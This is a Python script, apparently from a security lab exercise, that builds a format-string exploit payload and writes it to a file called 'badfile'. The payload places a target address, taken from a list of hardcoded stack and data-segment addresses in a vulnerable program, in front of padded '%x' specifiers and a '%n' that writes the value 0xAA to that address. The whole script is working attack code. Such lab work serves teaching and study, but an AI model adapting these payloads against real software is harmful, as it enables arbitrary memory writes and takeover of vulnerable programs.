# Initialize the content array
CONTENT_LENGTH = 1000
content = bytearray(0 for i in range(CONTENT_LENGTH))

current_index = 0

"""Prefix format specifiers (optional)

N = 1
fmt1 = ("%.8x" * N).encode()  # %x means unsigned int as a hexadecimal number
content[current_index : current_index + len(fmt1)] = fmt1
current_index += len(fmt1)
print("format specifiers 1 is ", fmt1)
"""

# specify target_address
# try to use the address of target_1 (local in fmttr) or target_2 (local in main) or target_3(global) and see the difference
# Address of target_1: 0xffffcea0 (stack)
# Address of target_2: 0xffffd2a4 (stack)
# Address of target_3: 0x56559008 (data segment)
# Address of target_4[0]: 0x5655a1a0
# Address of target_4[1]: 0x5655a1a4
target_address = 0xFFFFCEA0
content[current_index : current_index + 4] = target_address.to_bytes(
    4, byteorder="little"
)
current_index += 4

# specify target_value
N = 4
target_value = 0xAA
num_of_padding_zeros = target_value - 8 * (N - 1) - 4
fmt2 = ("%.8x" * (N - 1) + f"%.{num_of_padding_zeros}x" + "%n" + "\n").encode()
content[current_index : current_index + len(fmt2)] = fmt2
print("format specifiers 2 is ", fmt2)

with open("badfile", "wb") as f:
    f.write(content)
